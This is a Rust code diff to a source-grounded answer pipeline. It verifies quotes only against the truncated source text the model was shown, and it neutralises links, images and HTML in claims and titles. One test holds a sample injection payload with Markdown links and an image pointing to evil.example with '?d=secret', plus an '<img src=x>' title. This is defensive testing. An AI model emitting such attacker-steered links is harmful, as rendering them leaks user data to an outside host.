@@ -80,11 +80,25 @@ pub fn pack_sources(sources: &[Source], per_source_chars: usize) -> String {
         };
         p.push_str(&head);
         p.push('\n');
-        let text: String = s.text.trim().chars().take(per_source_chars).collect();
-        p.push_str(&text);
+        p.push_str(&shown_text(&s.text, per_source_chars));
         p.push_str("\n\n");
     }
     p.trim_end().to_string()
+}
+
+/// **The sources as the model was shown them**: each text cut exactly as [`pack_sources`] cuts it.
+/// [`verify`] must be given these, never the full texts. A quote from past the cut is one the model
+/// was not shown — recalled from training, or invented and lucky — and checking it against the full
+/// text let it through (2026-10-29, `docs/research/2026-10-29-web-research.md`, D3).
+pub fn as_shown(sources: &[Source], per_source_chars: usize) -> Vec<Source> {
+    sources
+        .iter()
+        .map(|s| Source { text: shown_text(&s.text, per_source_chars), ..s.clone() })
+        .collect()
+}
+
+fn shown_text(text: &str, per_source_chars: usize) -> String {
+    text.trim().chars().take(per_source_chars).collect()
 }
 
 /// The shape [`crate::prompts::GROUNDED_JSON_INSTRUCTION`] asks for. `answerable` comes first (keys
@@ -212,7 +226,7 @@ fn assemble_body(verified: &[Claim], sources: &[Source]) -> String {
             }
             _ => format!("[{}]", c.source_id),
         };
-        out.push_str(&format!("- {} {}\n", c.text.trim(), cite));
+        out.push_str(&format!("- {} {}\n", inert(&c.text), cite));
     }
     // Which sources were actually cited by a surviving claim — unique, ascending.
     let mut used: Vec<usize> = verified.iter().map(|c| c.source_id).collect();
@@ -222,13 +236,37 @@ fn assemble_body(verified: &[Claim], sources: &[Source]) -> String {
     for id in used {
         if let Some(s) = sources.iter().find(|s| s.id == id) {
             if s.url.trim().is_empty() {
-                out.push_str(&format!("- [{}] {}\n", id, s.title.trim()));
+                out.push_str(&format!("- [{}] {}\n", id, inert(&s.title)));
             } else {
-                out.push_str(&format!("- [{}] {} — {}\n", id, s.title.trim(), s.url.trim()));
+                out.push_str(&format!("- [{}] {} — {}\n", id, inert(&s.title), s.url.trim()));
             }
         }
     }
     out.trim_end().to_string()
+}
+
+/// **A claim or a source title as plain text in the note** — never Markdown that acts. Both come from
+/// text a source supplied (a claim is the model's words, and a page can steer them; a GitHub
+/// repository's name and description are anyone's), and the note renders Markdown. So a link, an
+/// image or HTML is written as its characters: `[ ] < >` and the backslash are escaped, and anything
+/// that looks like an address is dropped — the URL a statement came from is the citation's, which
+/// code writes (2026-10-29, `docs/research/2026-10-29-web-research.md`, D4).
+fn inert(s: &str) -> String {
+    let words: Vec<&str> = s
+        .split_whitespace()
+        .filter(|w| {
+            let w = w.to_ascii_lowercase();
+            !(w.contains("://") || w.contains("www.") || w.contains("mailto:"))
+        })
+        .collect();
+    let mut out = String::with_capacity(s.len());
+    for c in words.join(" ").chars() {
+        if matches!(c, '\\' | '[' | ']' | '<' | '>') {
+            out.push('\\');
+        }
+        out.push(c);
+    }
+    out
 }
 
 /// Parse the quote-first draft into `(claim_text, source_id, quote)` triples. Tolerant of a small
@@ -634,5 +672,45 @@ mod tests {
         let g = verify(draft, &sources);
         assert!(g.verified.is_empty());
         assert_eq!(g.body, "- The sources found did not support an answer to this question.");
+    }
+
+    /// D3: the model sees each source cut to a length; the check must see the same cut, or a quote
+    /// from past it — one the model was never shown — passes.
+    #[test]
+    fn a_quote_from_past_the_cut_is_not_supported_by_the_source_as_shown() {
+        let full = vec![src(1, "A", "", "Shown part. Hidden part says the tower is gold.")];
+        let shown = as_shown(&full, 11);
+        assert_eq!(shown[0].text, "Shown part.");
+        assert_eq!(pack_sources(&shown, 11), pack_sources(&full, 11), "one cut, both places");
+        let draft = "- The tower is gold [1]\n> the tower is gold";
+        assert_eq!(verify(draft, &full).verified.len(), 1, "the full text holds it");
+        assert_eq!(verify(draft, &shown).verified.len(), 0, "what was shown does not");
+    }
+
+    /// D4: a claim is the model's words, and a page can steer them. In the note it is text: no link,
+    /// no image, no HTML, no address — the citation's link is the only one, and code writes it.
+    #[test]
+    fn a_claim_and_a_title_reach_the_note_as_text_that_cannot_link() {
+        let srcs = vec![src(
+            1,
+            "evil/repo <img src=x>",
+            "https://github.com/evil/repo",
+            "Vitamin K is needed for blood clotting.",
+        )];
+        let draft = "- Vitamin K helps clotting, see [details](https://evil.example/?d=secret) \
+                     ![x](https://evil.example/p.png) <a href=x>here</a> www.evil.example [1]\n\
+                     > Vitamin K is needed for blood clotting.";
+        let g = verify(draft, &srcs);
+        assert_eq!(g.verified.len(), 1);
+        let claim_line = g.body.lines().next().unwrap();
+        assert!(!claim_line.contains("evil.example"), "no address survives: {claim_line}");
+        let cite = "[\\[1\\]](https://github.com/evil/repo)";
+        let text = claim_line.strip_suffix(cite).expect("the citation's link closes the line");
+        assert!(!text.contains("](") && !text.contains("!["), "no link but the citation's: {text}");
+        // A word carrying an address goes whole; what is left is text, its brackets escaped.
+        assert!(
+            claim_line.starts_with("- Vitamin K helps clotting, see \\<a href=x\\>here\\</a\\> ")
+        );
+        assert!(g.body.contains("- [1] evil/repo \\<img src=x\\> — https://github.com/evil/repo"));
     }
 }
